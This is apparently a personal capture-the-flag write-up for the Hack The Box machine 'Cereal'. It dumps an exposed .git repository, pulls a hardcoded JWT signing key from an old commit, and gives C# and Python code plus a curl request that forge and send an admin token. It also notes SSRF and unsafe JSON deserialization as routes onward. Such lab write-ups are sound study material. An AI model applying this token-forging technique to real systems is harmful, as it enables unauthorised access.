# Source Code

## Git Dumper

We know from our [[Writeups/Hack the Box/Boxes/Cereal/5 - Enumeration#source cereal htb|gobuster scan]] that there is a `.git` folder on the `source.cereal.htb` domain. So we can try and download the source code for the site using the tool `gitdumper`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ /opt/git-dumper/git-dumper.py http://source.cereal.htb/.git site/
```

This downloads all the code, and we can open it in VSCode.

Running `git log` shows us an interesting commit:

![[Pasted image 20210605185207.png]]

We can view the details with `git show`:

![[Pasted image 20210605185310.png]]

There are also some interesting files in the `.gitignore` - namely, `cereal.db`, which is likely the name of the database file being used. It's not in the downloaded repository.

## Controllers + Routes

I was unfamiliar with .NET going into this, but I'd done a little C# and a lot of Laravel - the first thing I went looking for to try and understand the application was Controllers & Routes.

`site/Controllers/RequestsController.cs` has what looks like controller methods - 

![[Pasted image 20210605191522.png]]

I couldn't find a corresponding 'route' pointing to these methods, like in Laravel, so I assumed this is the entire route definition. However, I did find the `site/ClientApp/src/_components/PrivateRoute.jsx` component, which seems to check for authentication:

![[Pasted image 20210605191834.png]]

I looked for instances of the private route component, and found a few more routes in the `site/ClientApp/src/App/App.jsx` file:

![[Pasted image 20210605191917.png]]

This shows us there is an authenticated `/admin` page. It is defined by `site/ClientApp/src/AdminPage/AdminPage.jsx` and seems to render Cereal Requests from the database:

![[Pasted image 20210605192048.png]]

`site/ClientApp/src/HomePage/HomePage.jsx` seems to be a submission form, and tells us which fields we need to submit a cereal:

![[Pasted image 20210605212024.png]]

The `site/ClientApp/src/_services/request.service.js` file tells us a bit about request methods, also:

![[Pasted image 20210605212547.png]]

## Authentication

Auth seems to be handled mostly by the `site/Services/UserService.cs` file, which generates JWT tokens:

![[Pasted image 20210605192151.png]]

Users seem to be saved locally using Javascript, as shown in the `site/ClientApp/src/_services/authentication.service.js` file:

![[Pasted image 20210605212657.png]]

We can use the token in the repository's old commits to craft a JWT token

### .NET

I made an attempt to generate a JW with C# code, looking at these links for reference:
- https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/main-and-command-args/
- https://stackoverflow.com/questions/20392243/run-c-sharp-code-on-linux-terminal
- https://stackoverflow.com/questions/18677837/decoding-and-verifying-jwt-token-using-system-identitymodel-tokens-jwt

This was the code I used, lifted from the main project and deleting the references to other unnecessary libraries:

```csharp
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;

namespace TokenGeneration {
    class GenerateToken {
        static void Main(string[] args)
        {
            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");

            //create token descriptor for user id 1
            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new Claim[]
                {
                    new Claim(ClaimTypes.Name, "1")
                }),
                Expires = DateTime.UtcNow.AddDays(7),
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };

            var token = tokenHandler.CreateToken(tokenDescriptor);
            Console.WriteLine(tokenHandler.WriteToken(token));
        }
    }
}
```

I tried `mcs` to compile it, but it was missing a dependency:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ mcs -out:gentoken.exe gentoken.cs 
gentoken.cs(3,14): error CS0234: The type or namespace name `IdentityModel' does not exist in the namespace `System'. Are you missing an assembly reference?
Compilation failed: 1 error(s), 0 warnings
```

I knew I could resolve this on Windows pretty easily with Visual Studio, but didn't have it setup on Linux. I considered [installing .NET](https://docs.microsoft.com/en-us/dotnet/core/install/linux-ubuntu) but didn't think it was worth fiddling with if there was an easier way. I also didn't want to set up a Windows VM, so looked to see if I could use Python instead.

### Python

I used the `jwt` library for this: [https://pyjwt.readthedocs.io/en/latest/](https://pyjwt.readthedocs.io/en/latest/)

After a bit of experimenting with JWT tokens I came to the following code to spit a valid one out:

```python
import jwt
from datetime import datetime, timedelta

#take key from old git code - commit ID 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
key = "secretlhfIH&FY*#oysuflkhskjfhefesf"

#encode with HMAC-SHA-256
encoded = jwt.encode({"exp": datetime.utcnow() + timedelta(days=7), "name": 1}, key, algorithm="HS256")

print(encoded)
```

This can now be used when making requests, for example to `/requests`. This is what I used to build up a valid one - one of the key things that caused issues was not giving the JWT an expiry, which I thought was interesting - `WWW-Authenticate: Bearer error="invalid_token", error_description="The token has no expiration"`

## IP Whitelist

Several functions have the decorator:

```csharp
[Authorize(Policy = "RestrictIP")]
```

This means those functions are only accessible by localhost, i.e. the box itself. We can see this if we request a cereal:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.10.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTgzMDA5ODMsIm5hbWUiOjF9.VgWvwKp0RMrr4NLnJxnIWoUJII3JQlUJecyFVpDlXvo' \
    $'https://10.10.10.217/requests?id=11'
HTTP/2 403 
server: Microsoft-IIS/10.0
strict-transport-security: max-age=2592000
x-rate-limit-limit: 5m
x-rate-limit-remaining: 148
x-rate-limit-reset: 2021-04-06T09:46:42.2058184Z
x-powered-by: Sugar
date: Tue, 06 Apr 2021 09:42:08 GMT
```

Even with a valid token, we receive a `403` status code.

This means that, to make requests to these controller methods, we must force the box to make a request on our behalf - this is known as a Server Side Request Forgery (SSRF).

## Requests Controller

The file `Controllers/RequestsController.cs` defines the Cereal Requests logic, and has a method that deserialises a JSON. This corresponds to the `/requests?id={ID}` route.

```csharp
var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
{
	TypeNameHandling = TypeNameHandling.Auto
});
```

However, the route is subject to the IP whitelist policy. This means it is only accessible by the box itself.